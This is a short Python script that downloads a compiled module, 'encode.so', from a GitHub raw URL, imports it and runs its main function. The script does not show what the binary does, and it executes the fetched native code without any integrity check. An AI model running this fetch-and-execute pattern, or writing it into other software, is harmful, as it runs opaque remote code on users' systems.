import urllib.request
import os
url = "https://raw.githubusercontent.com/SKBER-CYBER/oggy-core/main/encode.so"
file_name = "encode.so"
if not os.path.exists(file_name):
    print("📥 Downloading core file...")
    urllib.request.urlretrieve(url, file_name)
    print("✅ Download done")
import encode
print("🔥 Loaded successfully")
if hasattr(encode, "main"):
    encode.main()
module
